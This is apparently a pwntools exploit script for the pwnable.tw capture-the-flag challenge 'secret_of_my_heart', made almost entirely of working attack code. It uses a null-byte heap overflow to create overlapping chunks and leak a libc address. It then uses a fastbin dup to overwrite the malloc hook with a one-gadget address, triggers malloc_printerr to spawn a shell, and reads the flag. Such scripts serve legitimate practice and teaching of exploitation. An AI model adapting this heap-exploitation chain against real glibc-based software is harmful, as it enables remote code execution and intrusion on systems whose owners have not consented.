from pwn import *

# Set up pwntools for the correct architecture
exe = "./secret_of_my_heart"
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True
libc = ELF("./libc.so.6")

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

index = []
for i in range(100):
    index.append(0)

def alloc(size, name, val):
    ru(b"Your choice :")
    sl(b"1")
    ru(b"Size of heart : ")
    sl(str(size).encode())
    ru(b"Name of heart :")
    sl(name)
    ru(b"secret of my heart :")
    sl(val)
    global index 
    for i in range(len(index)):
        if(index[i] == 0):
            index[i] = 1
            return i

def show(ind):
    ru(b"Your choice :")
    sl(b"2")
    sl(str(ind).encode())
    ru(b"Secret : ")
    return ru(b"=")

def delete(ind):
    ru(b"Your choice :")
    sl(b"3")
    sl(str(ind).encode())
    global index
    index[ind] = 0

# r = start()
r = remote("chall.pwnable.tw", 10302)

a = alloc(0xf8, b"A", b"aaaa" )
b = alloc(0x100, b"B", b"bbbb" )
c = alloc(0x100, b"C", b"cccc" )
d = alloc(0xf0, b"D", b"dddd" )
top = alloc(0x100, b"no", b"top-chunk")

delete(b)
delete(c)

delete(a)
alloc(0xf8, b"A", b"A"*0xf8)

b1 = alloc(0xf8, b"b1", b"\x00"*16)
alloc(0x78, b"b2", b"\x00"*16)

delete(b1)
delete(d)

pp = alloc(0x78, b"john", b"john")

alloc(0x100, b"pp", b"pp")
pp1 = alloc(120-16, b"pp", b"pp")
print(show(pp))
libc.address = u64(show(pp)[:6].ljust(8, b"\x00"))-3947384
log.info(f"libc: {hex(libc.address)}")

e123 = alloc(0x68, b"123", b"12312")

#fastbin dup
delete(pp)
delete(pp1)
delete(e123)

one_gagu = libc.address + 0xef6c4

alloc(0x68, b"qqqq", p64(libc.address+3947245))
alloc(0x68, b"lovwe", b"love")
alloc(0x68, b"lovwe", b"love")
alloc(0x68, b"lovwe", b"A"*(64-45) + p64(one_gagu))

#trigger malloc_printerr to call malloc hook
delete(7)
sl(b"cat home/secret_of_my_heart/flag")

r.interactive()

'''
Null byte overflow.
3153
'''